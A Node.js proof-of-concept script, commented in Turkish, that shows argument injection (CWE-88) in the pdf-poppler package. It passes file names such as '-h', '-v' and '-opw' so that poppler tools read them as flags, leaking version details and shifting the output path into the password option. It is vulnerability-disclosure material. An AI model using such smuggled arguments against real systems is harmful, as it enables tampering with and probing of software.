const path = require('path');
const fs = require('fs');
const pdfPoppler = require('pdf-poppler');

const outDir = path.join(__dirname, 'output-pdf');
if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });

async function main() {
    // TEST 1: info("-h") - yardım çıktısı
    console.log('=== TEST 1: pdfPoppler.info("-h") ===');
    try {
        const result = await pdfPoppler.info('-h');
        console.log('Sonuc:', JSON.stringify(result));
        console.log('INFO: pdfinfo -h hata vermeden cikti ama bos obje dondu.');
        console.log('PDF dosyasi islemedi, yardim ciktisi gosterdi (argument injection).\n');
    } catch (err) {
        if (err.stderr && err.stderr.includes('Usage: pdfinfo')) {
            console.log('!!! INJECTION KANITLANDI: pdfinfo yardim gosterdi !!!');
        }
        console.log('stderr:', (err.stderr || '').substring(0, 200), '\n');
    }

    // TEST 2: info("-v") - sürüm bilgisi sızdırma
    console.log('=== TEST 2: pdfPoppler.info("-v") ===');
    try {
        const result = await pdfPoppler.info('-v');
        console.log('Sonuc:', JSON.stringify(result), '\n');
    } catch (err) {
        if (err.stderr && err.stderr.includes('version')) {
            console.log('!!! INJECTION KANITLANDI: poppler surumu sizdirildi !!!');
            console.log('stderr:', err.stderr.trim(), '\n');
        } else {
            console.log('Hata:', err.message.substring(0, 200), '\n');
        }
    }

    // TEST 3: convert("-h", opts) - pdftocairo yardım
    console.log('=== TEST 3: pdfPoppler.convert("-h", opts) ===');
    try {
        const result = await pdfPoppler.convert('-h', {
            format: 'jpeg', scale: 1024, out_dir: outDir, out_prefix: 'test'
        });
        console.log('Sonuc:', result, '\n');
    } catch (err) {
        if (err.stderr && err.stderr.includes('Usage: pdftocairo')) {
            console.log('!!! INJECTION KANITLANDI: pdftocairo yardim gosterdi !!!');
        }
        console.log('stderr:', (err.stderr || '').substring(0, 200), '\n');
    }

    // TEST 4: convert("-opw", opts) - argüman kaydırma
    console.log('=== TEST 4: pdfPoppler.convert("-opw", opts) ===');
    console.log('"-opw" dosya adi olarak verilirse, output yolu sifre olarak yutulur.');
    try {
        const result = await pdfPoppler.convert('-opw', {
            format: 'jpeg', scale: 1024, out_dir: outDir, out_prefix: 'test'
        });
        console.log('Sonuc:', result, '\n');
    } catch (err) {
        console.log('Hata:', err.message.substring(0, 300));
        if (err.stderr) console.log('stderr:', err.stderr.substring(0, 300));
        const expectedOutput = path.join(outDir, 'test-1.jpeg');
        console.log('Output var mi?', fs.existsSync(expectedOutput) ? 'EVET' : 'HAYIR');
        console.log('');
    }

    // TEST 5: Doğrudan execFile ile "-h" → stderr'de help olduğunu göster
    console.log('=== TEST 5: Dogrudan execFile ile kanitlama ===');
    const { execFile } = require('child_process');
    const popplerBin = path.join(__dirname, 'node_modules', 'pdf-poppler', 'lib', 'win', 'poppler-0.51', 'bin');

    await new Promise((resolve) => {
        execFile(path.join(popplerBin, 'pdfinfo.exe'), ['-h'], { encoding: 'utf8', shell: false }, (err, stdout, stderr) => {
            const output = stderr || stdout || '';
            if (output.includes('Usage: pdfinfo')) {
                console.log('!!! KANITLANDI: "-h" dosya adi pdfinfo bayragi olarak yorumlandi !!!');
                console.log('pdfinfo surumu:', output.split('\n')[0]);
            }
            resolve();
        });
    });

    console.log('\n=== SONUC ===');
    console.log('pdf-poppler tum fonksiyonlarda (info, convert, imgdata)');
    console.log('dosya yolunu "--" ayiricisi olmadan poppler araclarina gecirir.');
    console.log('"-" ile baslayan dosya adi → poppler bayragi olarak yorumlanir.');
    console.log('CWE-88: Improper Neutralization of Argument Delimiters');
}

main().catch(console.error);
